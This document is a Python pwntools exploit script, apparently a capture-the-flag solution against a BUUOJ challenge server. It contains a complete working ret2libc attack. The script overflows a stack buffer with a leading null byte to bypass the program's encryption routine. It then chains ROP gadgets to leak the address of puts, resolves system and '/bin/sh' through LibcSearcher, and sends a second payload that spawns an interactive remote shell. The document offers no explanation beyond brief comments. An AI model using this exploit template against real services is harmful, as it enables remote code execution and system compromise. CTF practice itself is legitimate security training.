#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote("node4.buuoj.cn",26815)
context.log_level = "debug"

#Information about puts
main_addr = 0x400b28
puts_plt = 0x4006e0
puts_got = 0x602020
pop_rdi = 0x400c83
ret_addr = 0x4006b9

#1.get libc_base
payload = b'\0' + b'a' * (0x50 + 0x8 - 0x1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.recvuntil("Input your choice!\n")
p.sendline('1')
p.recvuntil("Input your Plaintext to be encrypted\n")
p.sendline(payload)
p.recvuntil("Ciphertext\n")
p.recvuntil("\n")
puts_addr = u64(p.recv(6).ljust(0x8,b"\x00"))
libc = LibcSearcher("puts",puts_addr)
libc_base = puts_addr - libc.dump("puts")
sys_addr=libc_base + libc.dump('system')
bin_sh=libc_base + libc.dump('str_bin_sh')
print(libc_base)
print("libc base: ", hex(libc_base))
print("system address: ", hex(sys_addr))

#2.get shell
payload = b'\0' + b'a' * (0x50 + 0x8 - 0x1) + p64(ret_addr) + p64(pop_rdi)  + p64(bin_sh) + p64(sys_addr)
p.recvuntil("Input your choice!\n")
p.sendline('1')
p.recvuntil("Input your Plaintext to be encrypted\n")
p.sendline(payload)

p.interactive()

